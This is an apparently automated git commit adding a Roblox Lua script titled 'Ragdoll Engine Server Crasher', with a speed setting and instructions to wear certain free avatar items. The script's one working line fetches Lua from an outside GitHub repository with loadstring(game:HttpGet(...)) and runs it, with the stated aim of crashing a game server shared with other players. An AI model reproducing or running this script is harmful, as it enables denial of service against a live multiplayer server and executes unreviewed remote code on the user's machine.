fc74d80a93a76972afb27eecd184f5a23eff7e7e
Emil Toth <emiltoth1870@gmail.com>
2023-03-08 17:00:30 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Ragdoll Engine Server Crasher.lua
@@ -0,0 +1,15 @@
+--CONFIG
+_G.FastMode = true -- true / false ()
+--Fast Mode true = 1 or 2 mins
+--Fast Mode off = +5 mins
+
+--[[ Instruction:
+   Wear these 4 shits: ALL FREE
+   []  https://www.roblox.com/catalog/4381828509/Junkbot-Hat
+   []  https://www.roblox.com/catalog/2493718915/The-High-Seas-Beatrix-The-Pirate-Queen-Hat
+   []  https://www.roblox.com/catalog/2493590711/Knights-of-Redcliff-Paladin-Helmet
+   []  https://www.roblox.com/catalog/2493720675/The-High-Seas-Beatrix-The-Pirate-Queen-Head
+   
+   U NEED POTION
+]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/martinelcrac/cryptonichub/main/ragdollenginecrash.lua", true))()
